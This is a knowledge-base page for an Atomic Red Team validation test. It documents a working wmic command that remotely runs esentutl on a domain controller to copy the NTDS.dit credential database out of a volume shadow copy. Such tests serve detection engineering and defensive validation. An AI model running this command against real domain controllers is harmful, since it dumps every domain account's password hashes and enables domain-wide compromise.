---
atomic_guid: "21c7bf80-3e8b-40fa-8f9d-f5b194ff2865"
title: "Create Volume Shadow Copy remotely (WMI) with esentutl"
framework: "atomic"
generated: "true"
attack_technique_id: "T1003.003"
attack_technique_name: "OS Credential Dumping: NTDS"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003.003/T1003.003.yaml"
build_date: "2026-04-26 17:02:12"
executor: "command_prompt"
aliases:
  - "21c7bf80-3e8b-40fa-8f9d-f5b194ff2865"
  - "Create Volume Shadow Copy remotely (WMI) with esentutl"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]

# Create Volume Shadow Copy remotely (WMI) with esentutl

This test is intended to be run from a remote workstation with domain admin context.
The Active Directory database NTDS.dit may be dumped by copying it from a Volume Shadow Copy created with esentutl.

## Metadata

- Atomic GUID: 21c7bf80-3e8b-40fa-8f9d-f5b194ff2865
- Technique: T1003.003: OS Credential Dumping: NTDS
- Platforms: windows
- Executor: command_prompt
- Elevation Required: True
- Source Path: atomics/T1003.003/T1003.003.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1003-os_credential_dumping|T1003.003]]

## Input Arguments

### source_path

- description: File to shadow copy
- type: string
- default: c:\windows\ntds\ntds.dit

### target_host

- description: IP Address / Hostname you want to target
- type: string
- default: localhost

### target_path

- description: Target path of the result file
- type: string
- default: c:\ntds.dit

## Dependencies

Target must be a reachable Domain Controller, and current context must be domain admin

### Prerequisite Check

```untitled
wmic /node:"#{target_host}" shadowcopy list brief
```

### Get Prerequisite

```untitled
echo Sorry, can't connect to target host, check: network, firewall or permissions (must be admin on target)
```

## Executor

- elevation_required: True
- name: command_prompt

### Command

```cmd
wmic /node:"#{target_host}" process call create "cmd.exe /c esentutl.exe /y /vss #{source_path} /d #{target_path}"
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003.003/T1003.003.yaml)
